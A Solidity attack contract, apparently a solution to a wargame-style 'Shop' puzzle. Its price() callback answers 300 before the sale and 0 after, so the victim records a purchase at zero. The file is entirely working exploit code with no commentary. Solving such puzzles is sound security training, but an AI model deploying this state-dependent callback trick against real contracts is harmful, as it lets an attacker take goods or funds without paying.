pragma solidity ^0.8.10;

interface IShop{
    function buy() external;
    function price() external returns(uint);
    function isSold() external returns(bool);
}

contract AttackShop{        
    IShop public shop;
    uint timesCalled; 

    constructor(address _victim) {
        shop = IShop(_victim);
    }

    function price() external returns (uint) {    
        return shop.isSold() ? 0 : 300;
    }
    function attack() public {        
        shop.buy();                
    }
}